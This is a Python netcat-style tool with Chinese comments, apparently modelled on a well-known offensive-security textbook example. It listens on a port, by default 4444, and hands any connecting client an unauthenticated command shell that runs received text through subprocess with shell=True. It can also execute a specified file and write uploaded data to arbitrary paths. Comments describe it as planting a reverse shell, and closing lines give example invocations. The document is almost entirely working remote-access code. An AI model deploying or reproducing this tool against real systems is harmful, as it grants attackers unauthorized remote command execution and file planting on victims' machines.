# -*- coding: utf-8 -*-
#!/usr/bin/python3

import sys
import socket
import getopt
import argparse
import threading
import subprocess

parser = argparse.ArgumentParser(description='a some command')
parser.add_argument('-l','--listen',action='store_true',help='listen on [host]:[port] for incoming connections')
parser.add_argument('-e','--execute', help='execute the given file upon receiving a connection')
parser.add_argument('-c','--command',action='store_true',help='initialize a command shell')
parser.add_argument('-u','--upload', help='upon receiving connection upload a file and write to [destination]')
parser.add_argument('-t','--target', default='0.0.0.0', help='add a host')
parser.add_argument('-p','--port', default='4444', help='add a port')
parser.add_argument('-up','--up', help='upload a file')

args    = parser.parse_args()

listen  = args.listen
command = args.command
target  = args.target
port    = int(args.port)
upload  = args.upload
execute = args.execute
up      = args.up

def usage():
	# 是进行监听还是仅从标准输入发送数据
	if not listen:
		# 从命令行读取内存数据
		# 这里将阻塞，所以不在向标准输入发送数据时发送CTRL-D
		# buffer = input()

		# 发送数据
		client_sender()

	# 我们开始监听并准备上传、执行命令
	# 放置一个反弹shell
	# 取决于上面的命令行选项
	if listen:
		server_loop()

def client_sender():

	client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	try:
		# 连接到目标主机
		client.connect((target,port))
		
		while True:
			ssin = sys.stdin.readline()
			if up:
				ssin = open( up,'rb').read()
				client.send(ssin)
			elif len(ssin):
				client.send(bytes(ssin,encoding='utf-8'))
			# 现在等待数据回传
			response = ""
			while True:
				data     = client.recv(4096)
				recv_len = len(data)
				response += str(data,encoding='gbk')

				if recv_len < 4096:
					break
			print(response)

	except Exception as e:
		print('[*] Exception! Exiting.\n%s' % e)
		client.close()

def server_loop():

	server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	server.bind((target,port))
	server.listen(5)
	print("[*] 监听在：[{}:{}]!".format(target, port))

	while True:
		client_socket, addr = server.accept()
		print('[+] 建立一个连接： %s' % str(addr))
		try:
			client_handler(client_socket)
		except Exception as e:
			print(e)

		# 分拆一个线程处理新的客户端
		# client_thead = threading.Thread(targer=client_handler, args=(client_socket,))
		# client_thead.start()

def run_command(command):
	# 换行
	command = command.rstrip()
	# 运行命令并将输出返回
	try:
		output = subprocess.check_output(command,stderr=subprocess.STDOUT,shell=True)
	except Exception as e:
		output = bytes("执行命令出错\n%s\r\n" % e,encoding='gbk')

	return output

def client_handler(client_socket):
	# 检测上传文件
	if upload:
		# 读取所有的字符并写下目标
		file_buffer = b""

		# 持续读取数据直到没有符合的数据
		while True:
			data = client_socket.recv(1024)

			if not data:
				break
			else:
				file_buffer += data
			if len(data) < 1024:
				break

		# 现在我们接收这些数据并将他们写出
		try:
			file_descriptor = open(upload,'wb')
			file_descriptor.write(file_buffer)
			file_descriptor.close()

			# 确认文件已经写出来
			client_socket.send(bytes('成功将文件写入到%s\r\n' % upload,encoding='gbk'))
		except Exception as e:
			client_socket.send(bytes('无法将文件保存到%s\n%s\r\n' % (upload,e),encoding='gbk'))
	
	# 检查命令执行
	if execute:
		
		# 运行命令			
		output = run_command(execute)
		client_socket.send(output)

	# 如果需要一个命令行shell，那么我们进入另一个循环
	print('cmmand前面')
	if command:
		print('cmmand if 里面')
		while True:
			# 现在我们接收文件直到发现换行符（enter key）
			cmd_buffer = ''
			while '\n' not in cmd_buffer:
				cmd_buffer += str(client_socket.recv(1024),encoding='utf-8')

			# 返还命令输出
			if cmd_buffer:
				response = run_command(cmd_buffer)

			# 返回响应数据
			client_socket.send(response)

usage()

# python3 argparses.py -l -p 888 -c
# python3 argparses.py -t 127.0.0.1 -p 888